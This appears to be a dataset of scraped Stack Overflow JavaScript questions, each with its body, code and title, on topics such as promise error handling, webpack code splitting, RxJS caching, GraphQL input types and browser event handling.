catch an error just to re-reject the same error.Am I missing a way of getting this to work simply?Am I missing some fundamental concept? <code>  function promiseString(str, timeout, doResolve) { return new Promise((resolve, reject) => { setTimeout(() => { if (doResolve) { resolve(str); } else { reject(new Error(""Rejecting "" + str)); } }, timeout); }); } promiseString(""One"", 100, true) .then((str) => { console.log(""First then is "" + str); return promiseString(str + "" two"", 100, true); }) .then((str) => { console.log(""Second then is "" + str); return promiseString(str + "" three"", 100, true); }) .then((str) => console.log(str)) .catch((err) => console.error(err)); function DoublePromiser(str1, str2, doResolve) { this.promise = new Promise((resolve, reject) => { promiseString(str1, 100, doResolve) .then((s1) => promiseString(s1 + str2, 100, doResolve)) .then((s2) => resolve(s2)); }); } var dp = new DoublePromiser(""Big"", ""Promise"", true); dp.promise .then((s) => console.log(""DoublePromise: "" + s)) .catch((err)=>console.log(""I did catch: "", err.message)); var dp = new DoublePromiser(""Big"", ""Promise"", false); dp.promise .then((s) => console.log(""DoublePromise: "" + s)) .catch((err)=>console.log(""I did catch: "", err.message)); function DoublePromiser(str1, str2, doResolve) { this.promise = new Promise((resolve, reject) => { promiseString(str1, 100, doResolve) .then((s1) => promiseString(s1 + str2, 100, doResolve)) .then((s2) => resolve(s2)) .catch((err) => reject(err)); // ADDING THIS TO MAKE IT WORK }); }",ES6 Promise Errors not bubbling up as expected

Require.ensure is blocking," If we have different bundles created by webpack and we require.ensure something to dynamically transfer+eval it at a later point in time, it happens via jsonPadding and some webpack js magic. If we have ""after..."" will get encountered when that module was entirely transferred and evaluated. If it happens to be that this chunk / module is pretty big, contains images, css and whatnot, the loading will pretty much lock down a browser while the webpack javascript code unpacks the bundle with all its components.Question: Is there any way to ""hook"" into that require magic? For instance, it would be a dream scenario to have callbacks for:whole file / chunk was transferredimage[1] was evaluatedcss[1] was evaluated / style tag was injectedjavascript was evaluatedand so forth, assuming that our transferred bundle contains a lot of data.

I consider it a simulation that's consistent of 3 big steps.First step: create a functional revolving Solar system with the 8 planets. Second step: create a function that adds new planets revolving around the same sun, with the click of a button with its specifics being based randomly (ie: distance from the sun, color of the planet, size of the planet, etc.)I'm on the third step, and I don't want things to be random anymore. The third step is for me by far the hardest one for me because I have little experience with JSON. I have data from all the exoplanets beyond our solar system from the NASA website, and I want to add these individal objects (planets) into the simulation with the function that adds the objects. My question to you is: How would my code need to look to have each individual record you see here in the JSON array in my code, as an element that's placed away from the black speck on the center of the screen (see the fiddle) in a random angle, this so it's not all aligned the same. In the end, I wish to have thousands of small specks that represent planets shown on the screen, where the black speck currently only visible, is to be the sun.This is because there are thousands of planets like this in my JSON file, and I want to see them all revolve with their respective distance from the sun ""Distance [pc]"", their respective size ""Planet Radius [Jupiter radii]"". Of course, the science wouldn't need to be accurate, but it should somewhat be. For example, the planet with the greatest Distance [pc] (distance in parsec) needs to be the farthest away, but still be able to be seen on the screen, even if it's just a little speck. Now I am aware that some math is involved to appropiately position each planet based on the distance property, because they are listed as distance in parsec, some conversion method would be in order to place them all on the same screen, while they're still visible.This is my code, but not all of it. To see all of it, click the link posted under this code. This fiddle holds the essential code. Note: this link has all of the 3000+ planets in the code, so it might act up on you in terms of loading.

How to change the HTML content as it's loading on the page," I do A/B Testing on our site and I do most of my work is in a JS file that is loaded at the top of the page before anything else is rendered but after jQuery has loaded which comes in handy at times.Taking a very simple example of changing an H1 tag, I would normally inject a style in the head to set the H1 opacity to 0 and then on DOMContentLoaded, I would manipulate the H1 contents and then set the opacity to 1. The reason for this is to avoid a flash of the old content before the change takes place - hiding the whole object is more graceful on the eye.I've started to look at the MutationObserver API. I've used this before when changing content in an overlay dialog box that the user could open which seems to be quite a cool approach and I'm wondering if anyone has managed to use a MutationObserver to listen to the document as it's first loading/ parsing and make changes to the document before first render and before DOMContentLoaded?This approach would then let me change the H1 content without having to hide it, change it, then show it.I've attempted but failed so far and have just ended up reading about the to-be-obselete Mutation Events and wondering if I'm trying to do something that just isn't possible. However we've (not me) have managed to put a robot on Mars so I'm hoping I can solve this.So is it possible to use MutationObservers to change the HTML content on-the-fly as the page is being loaded/ parsed?Thanks for any help or any pointers.Regards,Nick <code> ",How to change the HTML content as it's loading on the page?

When to use Array.of?," I was doing a bit of reading when I found Array.of.As per MDN,The Array.of() method creates a new Array instance with a variable number of arguments, regardless of number or type of the arguments. But if I already know the values, I can also wrap them in [] to get same output. So is there a specific scenario when we can/should use Array.of? Also is there any benefit of using it over []?Edit 1:Objective of this question is difference between Array.of vs [] and not new Array vs Array.of <code>  var a = Array.of(1,2,3,4,5);console.log(a)","Array.of vs ""[ ]"". When to use Array.of over ""[ ]""?"

Accurate drop on draggable element on scaled div," THE PROBLEMI'm having a minor problem dragging elements onto a scalable div container.Once the element is actually in the container, the elements drag fine and work the way they are supposed to.Larger elements that are dragged onto the scalable container don't have too much of an issue.But when smaller elements are dragged, you can see that the mouse is no longer attached to said element and when it is dropped, it drops a little off where it is supposed to drop.I'm trying to find a solution that my mouse stays on the element and it drops where it is supposed to drop.I've solved problems bit by bit and you can see below but this is the last piece of the puzzle that's driving me mad.

Replacing Boostrap Dropdown with Dropup (Different activity on two near identical implementations)," I'm working on a project over at github pages, which I replace a bootstrap .dropdown with .dropup if the div's overflow-y: scroll will cause the dropdown menu to be cutoff / overflow. You can see the function working properly at this jsfiddle. Notice if you click on the ellipsis icon to the right on the top rows, it will drop down, if you click on the icon on the bottom rows, it will drop up. Now, my actual implementation (github page), the code is exactly the same (below), but it wants to replace all .dropdown classes with .dropup when opened, including the top-most row which gets cut off, seen in the photo below. I've been struggling with this for a week and can't quite figure it out. I've tried a few different things that I thought fixed it but ended up just being a hack and didn't work on mobile, or replaced some but not all etc. Here is the Javascript / jQuery I'm using, which can be seen in the jsfiddle and my github source here. Edit: To clear up any confusion, here's an example of the behavior without my added .dropup function. jsfiddle Notice when you click the last menu item, it opens the menu but requires scrolling. I specifically want to remove the .dropdown class and add .dropup in this case, so no scrolling is required. <code>  $(document).on(""shown.bs.dropdown"", "".dropdown"", function () { // calculate the required sizes, spaces var $ul = $(this).children("".dropdown-menu""); var $button = $(this).children("".song-menu""); var ulOffset = $ul.offset(); // how much space would be left on the top if the dropdown opened that direction var spaceUp = (ulOffset.top - $button.height() - $ul.height()) - $('#playlist').scrollTop(); // how much space is left at the bottom var spaceDown = $('#playlist').scrollTop() + $('#playlist').height() - ((ulOffset.top + 10) + $ul.height()); // switch to dropup only if there is no space at the bottom AND there is space at the top, or there isn't either but it would be still better fit if (spaceDown < 0 && (spaceUp >= 0 || spaceUp > spaceDown)) $(this).addClass(""dropup"");}).on(""hidden.bs.dropdown"", "".dropdown"", function() { // always reset after close $(this).removeClass(""dropup"");});",Replacing Bootstrap Dropdown with Dropup (Different activity on two near identical implementations)
How to check if date is valid using moment js?," Following is the scenario:I have a String date and a date format which is different. Ex.:date: 2016-10-19dateFormat: ""DD-MM-YYYY"".I need to check if this date is a valid date.I have tried following things d.isValid() is returning false every time. Does not Moment.js parse the date in the given format?Then I tried to format the date in DD-MM-YYYY first and then pass it to Moment.js: Now date.isValid() is giving me the desired result, but here the Moment.js date object is created twice.

Shortest code for Rxjs cached http request while not complete," I'm trying to create an observable flow that fulfills the following requirements:Loads data from storage at subscribe timeIf the data has not yet expired, return an observable of the stored valueIf the data has expired, return an HTTP request observable that uses the refresh token to get a new value and store itIf this code is reached again before the request has completed, return the same request observableIf this code is reached after the previous request completed or with a different refresh token, start a new requestI'm aware that there are many different answers on how to perform step (3), but as I'm trying to perform these steps together I am looking for guidance on whether the solution I've come up with is the most succinct it can be (which I doubt!).Here's a sample demonstrating my current approach: <code>  var cachedRequestToken;var cachedRequest;function getOrUpdateValue() { return loadFromStorage() .flatMap(data => { // data doesn't exist, shortcut out if (!data || !data.refreshtoken) return Rx.Observable.empty(); // data still valid, return the existing value if (data.expires > new Date().getTime()) return Rx.Observable.return(data.value); // if the refresh token is different or the previous request is // complete, start a new request, otherwise return the cached request if (!cachedRequest || cachedRequestToken !== data.refreshtoken) { cachedRequestToken = data.refreshtoken; var pretendHttpBody = { value: Math.random(), refreshToken: Math.random(), expires: new Date().getTime() + (10 * 60 * 1000) // set by server, expires in ten minutes }; cachedRequest = Rx.Observable.create(ob => { // this would really be a http request that exchanges // the one use refreshtoken for new data, then saves it // to storage for later use before passing on the value window.setTimeout(() => { // emulate slow response saveToStorage(pretendHttpBody); ob.next(pretendHttpBody.value); ob.completed(); cachedRequest = null; // clear the request now we're complete }, 2500); }); } return cachedRequest; });}function loadFromStorage() { return Rx.Observable.create(ob => { var storedData = { // loading from storage goes here value: 15, // wrapped in observable to delay loading until subscribed refreshtoken: 63, // other process may have updated this between requests expires: new Date().getTime() - (60 * 1000) // pretend to have already expired }; ob.next(storedData); ob.completed(); })}function saveToStorage(data) { // save goes here}// first requestgetOrUpdateValue().subscribe(function(v) { console.log('sub1: ' + v); }); // second request, can occur before or after first request finisheswindow.setTimeout( () => getOrUpdateValue().subscribe(function(v) { console.log('sub2: ' + v); }), 1500); ",Shortest code to cache Rxjs http request while not complete?

Migrating from Webstack 1.x to 2.x," In Webpack 1.x I used to do the following on regular basis: With this technique, we were able to transfer a webpack-bundle over the wire, but evaluate the actual contents (the JavaScript code) from that bundle at some later point in time. Also, using require.ensure we could name the bundle, in this case myModule2, so we could see the name / alias when bundling happened executing webpack.In Webpack 2.x, the new way to go is using System.import. While I love receiving a Promise object now, I have two issues with that style. The equivalent of the above code would look like: How can we split the transfer and the evaluation now?How can we still name the bundle?The Webpack documentation on Github says the following: Full dynamic requires now fail by default A dependency with only an expression (i. e. require(expr)) will now create an empty context instead of an context of the complete directory. Best refactor this code as it won't work with ES6 Modules. If this is not possible you can use the ContextReplacementPlugin to hint the compiler to the correct resolving.I'm not sure if that plays a role in this case. They also talk about code splitting in there, but it's pretty briefly and they don't mention any of the ""issues"" or how to workaround. <code>  require.ensure([ './mod2.js' ], ( require ) => { setTimeout(() => { // some later point in time, most likely through any kind of event var data = require( './mod2.js' ); // actual evaluating the code },1100);}, 'myModule2'); System.import( './mod2.js' ).then( MOD2 => { // bundle was transferred AND evaluated at this point });",Migrating from Webpack 1.x to 2.x

Aurelia App Hello Worlld not working at all," I am creating a Sharepoint framework webpart, and I am trying to use Aurelia as my JavaScript framework.Basically I created a Sharepoint framework webpart, which when created with Yeoman, creates this folder structure.Then my files (just a simple hello world):app.html app.js main.ts index.html And the helloworld webpart: The code renders the HTML in the page, but without the message.I don't see any error in the browser console.I installed Aurelia with NPM no jspm. Executing gulp serve does not show any compilation error.I also created a typings file ""aurelia.d.ts"" in the typings subfolder.I think that my main problem is in the index.html, as it has a reference to 2 JavaScript files, but I am not sure how to reference them because they are inside the NPM modules folder and I don't think they are deployed when doing gulp serve.And by the way, here's my config.json: Errors in the console: FetchProvider.ts:30 GET https://softwares-macbook-pro.local:4321/sites/workbench/_api/Microsoft.SharePoint.Portal.SuiteNavData.GetSuiteNavData?v=2&Locale=undefined 404 (Not Found)FetchProvider.fetch @ FetchProvider.ts:30BasicHttpClient.fetchCore @ BasicHttpClient.ts:68HttpClient._fetchWithInstrumentation @ HttpClient.ts:183HttpClient.fetch @ HttpClient.ts:141HttpClient.get @ HttpClient.ts:154OnPremSuiteNavDataSource.loadData @ OnPremSuiteNavDataSource.ts:42SuiteNavManager._loadSuiteNavFromServer @ SuiteNavManager.ts:148SuiteNavManager._getSuiteNavModel @ SuiteNavManager.ts:129SuiteNavManager.loadSuiteNav @ SuiteNavManager.ts:106(anonymous function) @ Shell.ts:164Shell._startApplication @ Shell.ts:145Shell.start @ Shell.ts:141(anonymous function) @ SPModuleLoader.ts:178 TraceLogger.ts:147 [OnPremSuiteNavDataSource] Failed to retrieve Hybrid SuiteNavData TraceLogger.ts:147 [SuiteNavManager] SuiteNavManager loadData Failed to retrieve Hybrid SuiteNavData FetchProvider.ts:30 POST https://softwares-macbook-pro.local:4321/sites/workbench/_api/contextinfo 405 (Method Not Allowed)FetchProvider.fetch @ FetchProvider.ts:30DigestCache.fetchDigest @ DigestCache.ts:73HttpClient.fetch @ HttpClient.ts:129HttpClient.post @ HttpClient.ts:167SPOSuiteNavDataSource.loadData @ SPOSuiteNavDataSource.ts:41SuiteNavManager._loadSuiteNavFromServer @ SuiteNavManager.ts:153SuiteNavManager._getSuiteNavModel @ SuiteNavManager.ts:129SuiteNavManager.loadSuiteNav @ SuiteNavManager.ts:106(anonymous function) @ Shell.ts:164Shell._startApplication @ Shell.ts:145Shell.start @ Shell.ts:141(anonymous function) @ SPModuleLoader.ts:178 FetchProvider.ts:30 GET https://softwares-macbook-pro.local:4321/sites/workbench/_api/web/GetClientSideWebParts 404 (Not Found)FetchProvider.fetch @ FetchProvider.ts:30BasicHttpClient.fetchCore @ BasicHttpClient.ts:68HttpClient._fetchWithInstrumentation @ HttpClient.ts:183HttpClient.fetch @ HttpClient.ts:141HttpClient.get @ HttpClient.ts:154(anonymous function) @ ClientSideWebPartManager.ts:335ServiceScope.whenFinished @ ServiceScope.ts:174(anonymous function) @ ClientSideWebPartManager.ts:333ClientSideWebPartManager.fetchWebParts @ ClientSideWebPartManager.ts:327CanvasStore._fetchWebParts @ CanvasStore.ts:509CanvasStore @ CanvasStore.ts:93Canvas @ Canvas.ts:59Page.componentDidMount @ Page.tsx:28target.(anonymous function) @ index.js:153notifyAll @ react.js:869close @ react.js:12870closeAll @ react.js:15699perform @ react.js:15646batchedMountComponentIntoNode @ react.js:10882perform @ react.js:15633batchedUpdates @ react.js:8456batchedUpdates @ react.js:13706_renderNewRootComponent @ react.js:11076ReactMount__renderNewRootComponent @ react.js:12353_renderSubtreeIntoContainer @ react.js:11150render @ react.js:11170React_render @ react.js:12353SpWebpartWorkbench.onRender @ spWebpartWorkbench.tsx:44ClientSideApplication.render @ ClientSideApplication.ts:83(anonymous function) @ Shell.ts:165Shell._startApplication @ Shell.ts:145Shell.start @ Shell.ts:141(anonymous function) @ SPModuleLoader.ts:178 TraceLogger.ts:147 [SuiteNavManager] SuiteNavManager loadData Failed to retrieve SPO SuiteNavData TraceLogger.ts:145 [ClientSideWebPartManager] SyntaxError: Unexpected token C in JSON at position 0TraceLogger._writeToConsole @ TraceLogger.ts:145TraceLogger._log @ TraceLogger.ts:117TraceLogger.logError @ TraceLogger.ts:42(anonymous function) @ ClientSideWebPartManager.ts:355 TraceLogger.ts:147 [ClientSideWebPartManager] Successfully loaded modules for webpart 7fb7d3c1-c91b-4038-8e2b-2c7dc5376161 TraceLogger.ts:147 [BaseClientSideWebPart] Constructed web part: 568966e1-6496-4915-927f-ce874bbe7d27 OnPremSuiteNavDataSource.ts:65 Uncaught (in promise) Error: Failed to retrieve Hybrid SuiteNavData()OnPremSuiteNavDataSource._logAndThrowSuiteNavLoadingError @ OnPremSuiteNavDataSource.ts:65(anonymous function) @ OnPremSuiteNavDataSource.ts:45 Beacon.js:372 Beacon: Logged to UserEngagement with properties: {""EngagementName"":""SPPages.SPThemeProvider.loadData.Start"",""Properties"":""{\""appver\"":\""\""}"",""Duration"":0,""LogType"":0,""ClientTime"":1478836974552,""Source"":""ClientV2Reliability""} <code>  <template> ${message}</template> export class App { message = 'hello world';} import {Aurelia} from 'aurelia-framework';export function configure(aurelia) { aurelia.use .standardConfiguration() .developmentLogging();

Why is using `let` inside a `for` loop so slow on Chrome," MAJOR UPDATE.Thought as yet not on the Chrome major release the new Ignition+Turbofan engines for Chrome Canary 59 has solved the problem. Test show identical times for let and var declared loop variables.Original (now moot) question.When using let in a for loop on Chrome it runs very slowly, compared to moving the variable just outside the loop's scope. takes twice as long as What is going on?Snippet demonstrates the difference and only affects Chrome and has been so for as long as I can remember Chrome supporting let. When I first encountered this I thought it was because of the newly created instance of i but the following shows this is not so.See code snippet as I have eliminated any possibility of the additional let declaration being optimised out with ini with random and then adding to indeterminate value of k.I also added a second loop counter p  <code>  for(let i = 0; i < 1e6; i ++); { let i; for(i = 0; i < 1e6; i ++);} var times = [0,0]; // hold total timesvar count = 0; // number of testsfunction test(){ var start = performance.now(); for(let i = 0; i < 1e6; i += 1){}; times[0] += performance.now()-start; setTimeout(test1,10)}function test1(){ // this function is twice as quick as test on chrome var start = performance.now(); {let i ; for(i = 0; i < 1e6; i += 1);} times[1] += performance.now()-start; setTimeout(test2,10)}// display resultsfunction test2(){ var tot =times[0]+times[1]; time.textContent = tot.toFixed(3) + ""ms""; time1.textContent = ((times[0]/tot)*100).toFixed(2) + ""% "" + times[0].toFixed(3) + ""ms""; time2.textContent = ((times[1]/tot)*100).toFixed(2) + ""% "" + times[1].toFixed(3) + ""ms""; if(count++ < 1000){; setTimeout(test,10); }}var div = document.createElement(""div"");var div1 = document.createElement(""div"");var div2 = document.createElement(""div"");var time = document.createElement(""span"");var time1 = document.createElement(""span"");var time2 = document.createElement(""span"");div.textContent = ""Total execution time : ""div1.textContent = ""Test 1 : ""div2.textContent = ""Test 2 : ""div.appendChild(time);div1.appendChild(time1);div2.appendChild(time2);document.body.appendChild(div);document.body.appendChild(div1);document.body.appendChild(div2);test2() var times = [0,0]; // hold total timesvar count = 0; // number of testsvar soak = 0; // to stop optimizationsfunction test(){ var j; var k = time[1]; var start = performance.now(); for(let p =0, i = 0; i+p < 1e3; p++,i ++){j=Math.random(); j += i; k += j;}; times[0] += performance.now()-start; soak += k; setTimeout(test1,10)}function test1(){ // this function is twice as quick as test on chrome var k = time[1]; var start = performance.now(); {let p,i ; for(p = 0,i = 0; i+p < 1e3; p++, i ++){let j = Math.random(); j += i; k += j}} times[1] += performance.now()-start; soak += k; setTimeout(test2,10)}// display resultsfunction test2(){ var tot =times[0]+times[1]; time.textContent = tot.toFixed(3) + ""ms""; time1.textContent = ((times[0]/tot)*100).toFixed(2) + ""% "" + times[0].toFixed(3) + ""ms""; time2.textContent = ((times[1]/tot)*100).toFixed(2) + ""% "" + times[1].toFixed(3) + ""ms""; if(count++ < 1000){; setTimeout(test,10); }}var div = document.createElement(""div"");var div1 = document.createElement(""div"");var div2 = document.createElement(""div"");var time = document.createElement(""span"");var time1 = document.createElement(""span"");var time2 = document.createElement(""span"");div.textContent = ""Total execution time : ""div1.textContent = ""Test 1 : ""div2.textContent = ""Test 2 : ""div.appendChild(time);div1.appendChild(time1);div2.appendChild(time2);document.body.appendChild(div);document.body.appendChild(div1);document.body.appendChild(div2);test2()",Why is using `let` inside a `for` loop so slow on Chrome?

Node.js allowing only one async operation at a time," I'm building a site and one particular operation triggers a long, server-side process to run. This operation can't be run twice at the same time, so I need to implement some sort of protection. It also can't be made synchronous, because the server needs to continue responding to other requests while it runs.To that end I've constructed this small concept test, using sleep 5 as a substitute for my actual long-running process (requires express and child-process-promise, runs on a system with a sleep command but substitute whatever for Windows): The intention of this is when ""/test"" is requested it triggers a long operation, and if ""/test"" is requested again while it is running, it replies with ""busy"" and does nothing.My question is, is this implementation safe and correct? It appears to work in my cursory tests but it's suspiciously simple. Is this the proper way to essentially implement a mutex + a ""try-lock"" operation, or is there some more appropriate Node.js construct? Coming from languages where I'm used to standard multithreading practices, I'm not quite comfortable with Node's single-threaded-but-asynchronous nature yet. <code>  var site = require(""express"")();var exec = require(""child-process-promise"").exec;var busy = false;site.get(""/test"", function (req, res) { if (busy) { res.json({status:""busy""}); } else { busy = true; // <-- set busy before we start exec(""sleep 5"").then(function () { res.json({status:""ok""}); }).catch(function (err) { res.json({status:err.message}); }).then(function () { busy = false; // <-- finally: clear busy }); }});site.listen(8082);",Allowing only one async operation at a time

TamperMonkey - message between scripts," I have two scripts. Each runs on a different subdomain of our company ""Example.com"". Same domain, different subdomains.When a particular element appears on house.example.com, I need to send a message over to the script running on bob.fred.example.comSince Google extensions can exchange messages between extensions, there must be a way with TamperMonkey to exchange messages within the same extension, between scripts -- especially if they run on the same second-level domain.Can anyone point me in the right direction? An example or two would be worth their weight in gold.Update: Although Gothdo referenced Javascript communication between browser tabs/windows as containing an answer to this question, he failed to take into consideration the cross-origin policies involved. None of the answers in that referenced question provide a clear answer for cross-origin browser tab communications, which was the main point of this question.

In the second example btn1 is rendered only when you click on btn2 and after that if you click on btn1 nothing will happen. How can I attach the event to btn1 without changing all.js? Here is the entire code repositoryNote: Don't ask my why I try to do something like this, don't ask me why I am not allowed to change all.js because this example is a simplified one, in my case all.js file contains thousands of lines with lots of events on many elements. JavaScript solution means that I am not allowed to use other external libraries.UPDATE: Answer acceptanceI got a lot of different answers. Some of you worked harder to solve this issue, some of you worked less but the good thing is that I decided. I got some working solutions but some of them worked for only this particular case without taking in consideration that my real all.js file has 4029 lines of code, some solutions suggested to use event delegation which I agree but unfortunately I can not change my all.js file now. In the end I picked the best solutions, I've also considered who answered first, I've taken into consideration also who put a lot of work into this, etc. Anyways, the solution that I'm gonna implement is a merge between 2 solutions, Aruna's and Vlacav's solution (+ some changes by my self) and here it is: Unfortunately I can't split the reputation and I have to give it to only one of them and I want to give this to Vlacav because he was the first one who posted the the solution that I was searching for and he also did some changes on it when I asked him to do so. I also rated up Aruna's answer because he deserve this.I've posted the solution on a separate branch here and I also created several other branches on this repo with the other solutions that I received because they might be useful in other situations. <code>  (function(){ if (document.getElementById('btn1')){ document.getElementById(""btn1"").addEventListener(""click"", displayMessage); } function displayMessage(){ alert(""Hi!""); }})() <button id=""btn1"">Hit me !</button><script type=""text/javascript"" src=""all.js""></script> <button id=""btn2"" onclick=""show()"">Show</button><script type=""text/javascript""> function show(){ var btn = document.createElement(""BUTTON""); btn.setAttribute(""id"", ""btn1""); btn.innerHTML = ""Hit me !""; document.getElementById(""btn2""); document.body.insertBefore(btn, btn2); }</script><script type=""text/javascript"" src=""all.js""></script> function show(){ var btn = document.createElement(""BUTTON""); btn.setAttribute(""id"", ""btn1""); btn.innerHTML = ""Hit me !""; document.getElementById(""btn2""); document.body.insertBefore(btn, btn2); resetJs('all.js');}function resetJs(path) { var scripts = document.getElementsByTagName('script') , newScript = document.createElement(""script""); newScript.src = path + ""?timestamp="" + Math.round(new Date().getTime()/1000); for (var i = 0; i < scripts.length; ++i) { var srcUrl = scripts[i].getAttribute('src'); if (srcUrl && srcUrl.indexOf(path) > -1) { scripts[i].parentNode.replaceChild(newScript, scripts[i]); } }}",JavaScript attach events to elements rendered dynamically

Classical Method of Prototyping in Javascript," I'm on my journey to learn Object-Oriented Programming in Javascript.I got this video lession from here http://www.objectplayground.com/ which I understood quite a bit the prototypal method over classical method.While watching the lession, I was paused by the example shown for the classical method to work with subclasses which is the below: Question:From my understanding of call function, it will set the this to the current context which is for example from this line Answer.call(this,value) from the FirmAnswer function, so the _val from Answer will be set for the FirmAnswer and not for the Answer (please correct me if I'm wrong).So it leads me to my confusion if the above analyzation is correct, as to why the get property of the FirmAnswer.prototype returns Answer.prototype.get.call(this) and not just Answer.prototype.get() alone since the this is already set to FirmAnswer when calling new FirmAsnwer(7)?Please shed me some light as I'm pretty confused as of the moment. I'm pretty sure I understand well the prototypal method but the classical method confuses me quite a bit.Thank you in advance!  <code>  //superclassfunction Answer(value){ this._val = value;}//define prototype property 'get' for the superclassAnswer.prototype.get = function fn1(){ return this._val;}//subclassfunction FirmAnswer(value){ Answer.call(this,value);}FirmAnswer.prototype = Object.create(Answer.prototype);FirmAnswer.prototype.constructor = FirmAnswer;//define prototype property 'get' for subclassFirmAnswer.prototype.get = function fn2(){ return Answer.prototype.get.call(this);}var luckAnswer = new FirmAnswer(7);luckAnswer.get(); //7",How `this` works from a Classical Method of Prototyping in Javascript

What plugins should I include so I can use async/await?

Remove unnecessary fields before mutation in GraphQL," I've got a type called Article in my schema: For updates to it, there's a corresponding input type that is used by a updateArticle(id: ID!, article: ArticleInput!) mutation: The mutation itself looks like this: The article is always saved as a whole (not individual fields one by one) and so when I pass an article to that mutation that I've previously fetched, it throws errors like Unknown field. In field ""updated"", Unknown field. In field ""__typename"" and Unknown field. In field ""id"". These have the root cause, that those fields aren't defined on the input type.This is correct behaviour according to the spec:() This unordered map should not contain any entries with names notdefined by a field of this input object type, otherwise an errorshould be thrown.Now my question is what a good way to deal these kinds of scenarios is. Should I list all properties that are allowed on the input type in my app code?If possible I'd like to avoid this and maybe have a utility function slice them off for me which knows about the input type. However, since the client doesn't know about the schema, this would have to happen on the server side. Thus, the unnecessary properties would be transferred there, which I suppose is the reason why they shouldn't be transferred in the first place.Is there a better way than maintaining a list of properties?I'm using apollo-client, react-apollo and graphql-server-express. <code>  type Article { id: ID! updated: DateTime headline: String subline: String} input ArticleInput { headline: String subline: String} mutation updateArticle($id: ID!, $article: ArticleInput!) { updateArticle(id: $id, article: $article) { id updated headline subline }}",Remove read-only fields before mutation in GraphQL

keypress and keydown override paste event in Firefox & Safari," I have an Angular directive using jqlite and I want to bind a keypress, keydown and paste event to update the options on a directive.I'm binding to the paste, keypress and keydown event using: ... I tested my code and this solution works great in Chrome. However, when I test it in Firefox and Safari it fails. It appears that when I attempt to paste from the clipboard only the function attached to the keypress event gets called. If I comment out my binding to keypress then the function attached to keydown will get called. Finally, if I comment out keypress and keydown then the function bound to paste gets called and works properly. Is there a way to prevent keydown and keypress events from being fired/called on Firefox and safari when pasting from the clipboard and still detecting keydown and keypress separately?UpdateStill no luck finding an answer to this issue I've attempted using ng-paste, ng-keypress, and ng-keydown. I've tried element.addEventListener for paste, keypress and keydown. I've used jQuery's .on and .bind without luck.I've created a plunkr that reproduces the issue.http://plnkr.co/edit/EI0otzqCZrYWCA8GgeNY?p=previewFinal UpdateI found a solution as listed below instead of using keypress I used keyup and keydown events to detect when control or meta(super/windows) key was pressed. Then I filter out the necessary key events. My final solution is using jQuery to bind and unbind events.See Final Solution http://plnkr.co/edit/EI0otzqCZrYWCA8GgeNY?p=preview <code>  input.bind(""paste.elementClass"", updateOptions);input.bind(""keypress.elementClass"", updateOptions);// keypress does not fire if the backspace/delete button is pressed. This keydown listener triggers the// keypress event if backspace/delete is pressed. Didn't use keydown listener instead of keypress because// keydown did not register if multiple buttons are pressed (shift + d). The keyup event choked// if a button was pressed and held for longer than the model debounce time.input.bind(""keydown.elementClass"", function() { // handle this event differently}); function updateOptions(event) { var key = event.which || event.keyCode; if (event.type === 'paste') { scope.internalModel.searchText = event.originalEvent.clipboardData.getData('text'); } else { scope.internalModel.searchText = key ?

YouTube API & Websockets Make sure two videos are in sync (Video 1 pauses when Video 2 buffers))," BackgroundI am trying to integrate Videos into a slide show presentation app. I have disabled the controls on the students side and have a play/pause button wired up to the YouTube API so that when it is clicked an event is triggered through pusher and the Video starts on the teachers screen and the Students screen.DifficultiesThe problem comes when one of the users has a slow internet connection. If The teacher has faster internet than the student then the videos will be out of sync.My ApproachI have a function which uses the YouTube API to control the playing and pausing of a video. Inside the video object I have added an onStateChange event listener that is triggered when a video is playing/paused/buffering. The event is sent to this function. So when the teachers presses play the video starts and truggers a play event which gets sent to the above function. This function sends a pusher event to the students browser with a status of 1 which means play the video. This event is received by this function: My understandingTeacher presses play buttontogglePlay() is calledthis.isPlaying = false so playVideo() is calledvideo starts playing for teacherThe YouTube api then triggers an onStateChange eventthis is sent to the emittStateChange() function with status 1(playing)This status is sent via pusher to the students receiveStateChange()functionfor case = 1 this.isPlaying() is set to falsetoggle play is called to start the students videoStudents video starts buffering which triggers the youtube api onStateChange event againStatus 3 (buffering) is then sent back to the teacher via pusherThis pauses the teachers video to wait for the studentProblem:When the teachers video stops the onStateChange event is triggered yetagain before the students video is done buffering and sent to the student. This stops the students video and now both videos are paused.What I want:When the students video is buffering I just want to temporarily pause the teachers video UNTIL the students is playing then play both. I just don't understand how I should break this cycle that ends in both videos being paused. <code>  /** * */togglePlay: function(){ var videoId = this.videoId; if (this.isPlaying) { this.players[videoId].pauseVideo(); // Pauses the video this.isPlaying = false; } else { this.players[videoId].playVideo(); // Starts the video this.isPlaying = true; }}, /** * */emittStateChange: function(e){ switch(e.data) { // if the teachers video is... case 1: // playing pusher.channel4.trigger('client-youtube-triggered', { videoId: youtube.videoId, status: 1, // start the students video }); break; case 2: // paused pusher.channel4.trigger('client-youtube-triggered', { videoId: youtube.videoId, status: 2, // pause the students video }); break; case 3: // buffering pusher.channel4.trigger('client-youtube-triggered', { videoId: youtube.videoId, status: 2, // pause the students video }); }}, /** * */receiveStateChange: function(data){ this.videoId = data.videoId; switch(data.status) { // if the teachers video is... case 1: // playing this.isPlaying = false; this.togglePlay(); break; case 2: // paused this.isPlaying = true; this.togglePlay(); break; case 2: // buffering this.isPlaying = true; this.togglePlay(); }},",YouTube API & Websockets Make sure two videos are in sync (Video 1 pauses when Video 2 buffers)

Disabling contextmenu by adding event listener doesn't work," Disabling contextmenu via an event handlerI am trying to disable right click on an element.

Using the .d.ts typings locally in a node.js project," I am setting up a node.js project that uses a native add-on. The native add-on includes a large number of exported functions. I've setup a typings file (.d.ts) that includes all the function definitions and data etc. that are exported from the native add-on. When I pack all of this up with npm, and install it into the client project, the vscode intellisense picks up all the types and all is well.When I try to use the typings for a test.js in the same project as the native add-on, the typings are not being picked up, specifically the exported variables; I suspect it has something to do with the way they are exported in the .d.ts, or the naming of the module in the .d.ts.In the .d.ts, I have the exports listed as; I require the module in the client as (.js file); In the test code, I require it as (since I stub it through a index.js file); The index.js in turn looks like; How to I get vscode to use the typings, locally, for the intellisense when I use the add-on (via the index.js) for the test.js? <code>  interface MyI { Initiate() : void;}module 'modulename' { export var i : MyI;} var i = require(""modulename""); var i = require(""./index.js""); var i = require(""./lib/nativeaddon"");module.exports.i = i;",How to use the .d.ts typings locally for vscode intellisense in a node.js project?

